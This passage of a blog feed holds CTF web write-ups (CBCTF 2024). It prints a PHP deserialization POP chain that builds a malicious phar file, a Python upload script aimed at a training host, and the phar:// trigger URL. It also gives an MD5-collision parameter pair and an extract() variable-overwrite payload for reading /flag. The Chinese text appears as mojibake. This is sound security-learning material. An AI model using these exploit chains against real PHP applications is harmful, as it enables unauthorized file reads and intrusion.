class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;è¿™é‡Œæ˜¯makè‡ªå·±æ‚„æ‚„ç•™ç»™ä½ çš„ä¸€äº›ç¬”è®°å“¦ï¼Œæ‰“å¼€çœ‹çœ‹å§&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-comment">//å‰é¢å†™å¥½çš„é“¾å­</span><br><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br><br><span class="hljs-comment">//ç”Ÿæˆpharæ–‡ä»¶</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);    <span class="hljs-comment">//åˆ é™¤ä¹‹å‰çš„phar.pharæ–‡ä»¶(å¦‚æœæœ‰)</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();            <span class="hljs-comment">//å¼€å§‹å†™æ–‡ä»¶</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);    <span class="hljs-comment">//å†™å…¥stuå¤´éƒ¨ä¿¡æ¯</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$ray</span>);    <span class="hljs-comment">//é‡ç‚¹ï¼ï¼å°†æ„é€ å¥½çš„é“¾å­å†™å…¥meta-dataä¹Ÿå°±æ˜¯manifestå­—æ®µï¼Œè¿™é‡Œä¼šè‡ªåŠ¨è¿›è¡Œåºåˆ—åŒ–ï¼Œå› æ­¤ä¼ å…¥é“¾å¤´å°±è¡Œã€‚å…¶å®å¯ä»¥ç†è§£ä¸ºserializeï¼ˆ$oï¼‰;</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>, <span class="hljs-string">&quot;phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-comment">//æœ¬åœ°æµ‹è¯•</span><br><span class="hljs-comment">//$serialized = serialize($ray);//åœ¨æœ¬åœ°åºåˆ—åŒ–è§‚å¯Ÿä¸€ä¸‹åºåˆ—åŒ–çš„ç»“æœ</span><br><span class="hljs-comment">//echo $serialized;</span><br><span class="hljs-comment">//unserialize($serialized);//å¯ä»¥åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æˆåŠŸ</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ ¹æ®æºç æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„é™åˆ¶ï¼Œä¿®æ”¹ phar æ–‡ä»¶çš„åç¼€å˜ä¸º txtï¼Œç„¶åç”¨ python å‘é€æ–‡ä»¶åˆ°é¶æœº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://e12a0360-5b3b-412a-a898-6edf2af3f94a.training.0rays.club:8001/&quot;</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>res = requests.post(url, files=&#123;<span class="hljs-string">&quot;user_note&quot;</span>:file&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸè¿”å›ä¸Šä¼ æ–‡ä»¶çš„é‡å‘½ååç§°ï¼Œæœ€ååˆ©ç”¨ phar ä¼ªåè®® <code>phar://</code> è®¿é—®æ–‡ä»¶è§¦å‘ååºåˆ—åŒ–å³å¯</p><p><code>http://ï¼ˆé¶æœºï¼‰/index.php?note=phar:///notes/ï¼ˆé‡å‘½åçš„æ–‡ä»¶å.txtï¼‰</code></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/2.png"></p><h3 id="å‡ºç°çš„é—®é¢˜"><a href="#å‡ºç°çš„é—®é¢˜" class="headerlink" title="å‡ºç°çš„é—®é¢˜"></a>å‡ºç°çš„é—®é¢˜</h3><h4 id="1-æ²¡ææ¸…æ¥šå¯¹è±¡çš„å±‚æ¬¡ç»“æ„å¯¼è‡´é“¾å­æ„é€ é”™è¯¯"><a href="#1-æ²¡ææ¸…æ¥šå¯¹è±¡çš„å±‚æ¬¡ç»“æ„å¯¼è‡´é“¾å­æ„é€ é”™è¯¯" class="headerlink" title="1.æ²¡ææ¸…æ¥šå¯¹è±¡çš„å±‚æ¬¡ç»“æ„å¯¼è‡´é“¾å­æ„é€ é”™è¯¯"></a>1.æ²¡ææ¸…æ¥šå¯¹è±¡çš„å±‚æ¬¡ç»“æ„å¯¼è‡´é“¾å­æ„é€ é”™è¯¯</h4><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/3.png" alt="ä¿®æ”¹å‰"></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/4.png" alt="ä¿®æ”¹å"></p><h4 id="2-é¢˜ç›®çœ‹é”™"><a href="#2-é¢˜ç›®çœ‹é”™" class="headerlink" title="2.é¢˜ç›®çœ‹é”™"></a>2.é¢˜ç›®çœ‹é”™</h4><p>å–å€’æ•° 2<del>4 ä½ï¼Œææˆå€’æ•° 1</del>3 ä½ï¼Œå¦‚ä¸Šå›¾ mak4r1 å‡å–å€¼é”™è¯¯</p><h4 id="3-ä½¿ç”¨-phar-ä¼ªåè®®è§¦å‘ååºåˆ—åŒ–é”™è¯¯"><a href="#3-ä½¿ç”¨-phar-ä¼ªåè®®è§¦å‘ååºåˆ—åŒ–é”™è¯¯" class="headerlink" title="3.ä½¿ç”¨ phar ä¼ªåè®®è§¦å‘ååºåˆ—åŒ–é”™è¯¯"></a>3.ä½¿ç”¨ phar ä¼ªåè®®è§¦å‘ååºåˆ—åŒ–é”™è¯¯</h4><p>é”™è¯¯ <code>http://ï¼ˆé¶æœºï¼‰/index.php?note=phar://notes/ï¼ˆé‡å‘½åçš„æ–‡ä»¶å.txtï¼‰</code></p><p>æ­£ç¡® <code>http://ï¼ˆé¶æœºï¼‰/index.php?note=phar:///notes/ï¼ˆé‡å‘½åçš„æ–‡ä»¶å.txtï¼‰</code></p><p><code>/notes/ï¼ˆé‡å‘½åçš„æ–‡ä»¶å.txtï¼‰</code> æ‰æ˜¯æ­£ç¡®çš„æ–‡ä»¶è·¯å¾„ï¼Œç”¨ <code>phar://</code> ä¼ªåè®®åŒ…å«è¦ååºåˆ—åŒ–çš„æ–‡ä»¶</p><h3 id="å®˜æ–¹-WP"><a href="#å®˜æ–¹-WP" class="headerlink" title="å®˜æ–¹ WP"></a>å®˜æ–¹ WP</h3><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">2024 CBCTF WriteUps</a></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/5.png"></p><h1 id="æ€»ç»“ã€æ„Ÿæ‚Ÿã€æ”¶è·"><a href="#æ€»ç»“ã€æ„Ÿæ‚Ÿã€æ”¶è·" class="headerlink" title="æ€»ç»“ã€æ„Ÿæ‚Ÿã€æ”¶è·"></a>æ€»ç»“ã€æ„Ÿæ‚Ÿã€æ”¶è·</h1><h2 id="1-å¦‚ä½•ç†è§£é“¾å­çš„å±‚å±‚è°ƒç”¨ã€å¯¹è±¡çš„ç»“æ„å…³ç³»"><a href="#1-å¦‚ä½•ç†è§£é“¾å­çš„å±‚å±‚è°ƒç”¨ã€å¯¹è±¡çš„ç»“æ„å…³ç³»" class="headerlink" title="1.å¦‚ä½•ç†è§£é“¾å­çš„å±‚å±‚è°ƒç”¨ã€å¯¹è±¡çš„ç»“æ„å…³ç³»"></a>1.å¦‚ä½•ç†è§£é“¾å­çš„å±‚å±‚è°ƒç”¨ã€å¯¹è±¡çš„ç»“æ„å…³ç³»</h2><p>æ—¢ç„¶å«é“¾å­ï¼Œé‚£ä¹ˆå°±è¦ä¸€ç¯å¥—ä¸€ç¯ï¼Œé€šè¿‡è¿ç»­çš„è‡ªåŠ¨è°ƒç”¨æ¥è¾¾åˆ°â€œåˆ©ç”¨åŸæœ¬æ— æ³•åˆ©ç”¨çš„æºç â€çš„ç›®çš„ã€‚ç„¶è€Œï¼Œåªæœ‰å½“å‰å¯¹è±¡ä¸ºåŒ…å«æŸé­”æœ¯æ–¹æ³•çš„ç±»çš„å¯¹è±¡æ—¶ï¼Œå½“å‰å¯¹è±¡è§¦å‘è¯¥é­”æœ¯æ–¹æ³•è‡ªåŠ¨è°ƒç”¨çš„æ¡ä»¶ï¼Œè¯¥é­”æœ¯æ–¹æ³•çš„è‡ªåŠ¨è°ƒç”¨æ‰èƒ½ç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼š_0rays ç±»ä¸‹å«æœ‰é­”æœ¯æ–¹æ³•__wakeup()ï¼Œåªæœ‰å¯¹è±¡ ray ä¸º_0rays ç±»æ—¶ï¼Œå¯¹è±¡ ray è¢«ååºåˆ—åŒ–ï¼ˆè§¦å‘è°ƒç”¨æ¡ä»¶ï¼‰ï¼Œé­”æœ¯æ–¹æ³•__wakeup()è¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><p>æ‰€ä»¥ï¼Œè¦è®©é“¾å­ä¾æ¬¡è°ƒç”¨é­”æœ¯æ–¹æ³•ï¼Œé‚£ä¹ˆ<u>ä¸Šä¸€ä¸ªå¯¹è±¡</u>ä¸ºä¸Šä¸€ä¸ªç›®æ ‡é­”æœ¯æ–¹æ³•æ‰€åœ¨çš„ç±»çš„å¯¹è±¡ï¼Œ<u>ä¸Šä¸€ä¸ªå¯¹è±¡çš„å±æ€§</u>ä¸ºä¸‹ä¸€ä¸ªç›®æ ‡é­”æœ¯æ–¹æ³•æ‰€åœ¨çš„ç±»çš„å¯¹è±¡ï¼Œä»è€Œå°†ä¸€ä¸ªä¸ªé­”æœ¯æ–¹æ³•é“¾æ¥èµ·æ¥ã€‚<u>å½¢è±¡åœ°è®²å°±æ˜¯å¯¹è±¡æŒ‰å¯¹åº”é­”æœ¯æ–¹æ³•çš„è°ƒç”¨é¡ºåºä¾æ¬¡å¥—å¨ƒã€‚</u></p><blockquote><p>Tips:<br>å› ä¸ºæˆ‘èŠ±äº†ä¸å°‘åŠŸå¤«æ‰å¤§è‡´ææ˜ç™½ï¼Œæ‰€ä»¥å†™çš„æ¯”è¾ƒè¯¦ç»†ä¸”å•°å—¦ï¼Œå…‰çœ‹å¤ªç»•äº†ï¼Œæœ€å¥½ç»“åˆå‰é¢ CBCTF2024 Notes2 è°ƒè¯•æ—¶çš„å˜é‡ç»“æ„å›¾ç†è§£ï¼Œè°ƒè¯•ä¸€éçœ‹ä¸€ä¸‹ã€‚</p></blockquote><h1 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="å‚è€ƒèµ„æ–™ï¼š"></a>å‚è€ƒèµ„æ–™ï¼š</h1><p><a href="https://xz.aliyun.com/news/11953">https://xz.aliyun.com/news/11953</a></p><p><a href="https://cloud.tencent.com/developer/article/1945248">https://cloud.tencent.com/developer/article/1945248</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
      <tag>ååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CBCTF2024 WP</title>
    <link href="/2025/01/24/CBCTF2024/"/>
    <url>/2025/01/24/CBCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="CBCTF2024-WP"><a href="#CBCTF2024-WP" class="headerlink" title="CBCTF2024 WP"></a>CBCTF2024 WP</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-SignIn"><a href="#1-SignIn" class="headerlink" title="1.SignIn"></a>1.SignIn</h2><p><img src="/img/CBCTF2024/1.png"></p><p>ä¸»è¦æ˜¯ get ä¼ å‚ aã€bï¼Œå‚æ•°æœ¬èº«çš„å€¼ä¸ç­‰ï¼Œmd5 çš„ç»“æœå¼ºæ¯”è¾ƒç›¸ç­‰ï¼Œç»“åˆæç¤ºçš„ç½®é¡¶å¸–å­å³å¯ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br>&amp;<span class="hljs-attribute">b</span>=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç­”æ¡ˆã€‚</p><h2 id="2-Notes-1"><a href="#2-Notes-1" class="headerlink" title="2.Notes 1"></a>2.Notes 1</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è·¯å¾„ç©¿è¶Šçš„é¢˜ã€‚</p><p>URL å°è¯• <code>/notes_read.php?file=note3.txt</code> æ—¶å‘ç°è¿”å› <code>Error: File not found : /var/www/html/note3.txt</code> ä¹Ÿå°±å¾—çŸ¥è®¿é—®çš„æ ¹ç›®å½•åœ¨ <code>/var/www/html/</code>ï¼Œé€šè¿‡ <code>/notes_read.php?file=...</code></p><p>ä¼ å‚è¯»å–è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå› æ­¤è®¿é—® URL <code>/notes_read.php?file=notes_read.php</code> å°±å¯ä»¥çœ‹åˆ° notes_read.php çš„æºç ã€‚</p><p><img src="/img/CBCTF2024/2.png"></p><p>è¯»å®Œä»£ç å‘ç°å¯¹äºå‚æ•° <code>$file</code> å­˜åœ¨æ­£åˆ™åŒ¹é…ï¼Œä¸”å®é™…è¯»å–æ–‡ä»¶çš„è·¯å¾„ <code>$filePath</code> ç”± <code>$notes_directory</code> å’Œ <code>$file</code> æ‹¼æ¥è€Œæˆï¼Œæ— æ³•ç›´æ¥è·å– <code>/flag</code>ã€‚è€Œåå‘ç° <code>extract()</code> å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼Œæ‰€ä»¥ä¼ å‚ <code>/notes_read.php?file=flag&amp;notes_directory=/</code> å°†å˜é‡ <code>$notes_directory</code> çš„åŸå†…å®¹è¦†ç›–ï¼Œå†æ‹¼æ¥åå³ä¸º&#x2F;flag è·¯å¾„ï¼Œè¯»å–åˆ° flagã€‚</p><h2 id="3-Notes-2"><a href="#3-Notes-2" class="headerlink" title="3.Notes 2"></a>3.Notes 2</h2><p>æœªå®Œæˆ</p><p>å·²æœ‰æ€è·¯æ˜¯ååºåˆ—åŒ–å <code>_0rays</code> ç±»ä¸‹çš„ <code>__wakeup()</code> å…ˆè‡ªåŠ¨è°ƒç”¨ï¼Œè€Œå <code>__toString()</code>ï¼Œ<code>__set($a, $b)</code>ï¼Œ<code>__get($c)</code>ï¼Œ<code>__invoke()</code>ï¼Œ<code>__construct($filepath)</code>ï¼Œæœ€ç»ˆ <code>readfile($filepath);</code> è·å– flag</p><p>ä½†æ˜¯å®è·µèµ·æ¥è¿˜ä¸ç†Ÿç»ƒï¼Œæ²¡æœ‰åšå®Œã€‚</p><p><img src="/img/CBCTF2024/3.png"></p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><h2 id="é˜³å…‰é•¿è·‘"><a href="#é˜³å…‰é•¿è·‘" class="headerlink" title="é˜³å…‰é•¿è·‘"></a>é˜³å…‰é•¿è·‘</h2><p>è¡¥åšäº†é˜³å…‰é•¿è·‘ä¸€é¢˜ï¼Œä¸»è¦è€ƒç‚¹æ˜¯å‰åç«¯çš„é€šä¿¡äº¤äº’ï¼Œç”¨BPæŠ“åŒ…å‘ç°å¼€å§‹è·‘æ­¥åæµè§ˆå™¨å‘åç«¯å‘é€ä½ç½®ï¼ˆç»çº¬åº¦ï¼‰ä¿¡æ¯ï¼Œæ¨æµ‹åç«¯æ ¹æ®ä½ç½®ä¿¡æ¯çš„å˜åŒ–è·ç¦»åˆ¤æ–­è·‘æ­¥é•¿åº¦ï¼Œè·‘æ­¥æ—¶é•¿ç”±åç«¯è®¡ç®—åè¿”å›ï¼Œä¸å—å‰ç«¯å½±å“ã€‚</p><p>æ‰€ä»¥é€šè¿‡BPæ”¹å˜ä½ç½®ä¿¡æ¯ä½¿è·ç¦»è¾¾åˆ°è¦æ±‚ç„¶åå†ç­‰æ—¶é•¿åˆ°è¾¾åˆé€‚çš„æ—¶é—´å³å¯ã€‚</p><h2 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes 2"></a>Notes 2</h2><p>è¯¥é¢˜ä¸ºåŸºç¡€ PHP ååºåˆ—åŒ–ï¼Œæ€è·¯åŒä¸Šæ‰€è¿°ï¼Œå…·ä½“å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡åšæ–‡<a href="https://5i1encee.top/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93">PHPååºåˆ—åŒ–å°ç»“</a></p><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">å®˜æ–¹WP</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL çˆ†åº“åè¡¨ååˆ—åæ•°æ®å°ç»“</title>
    <link href="/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/"/>
    <url>/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/</url>
    
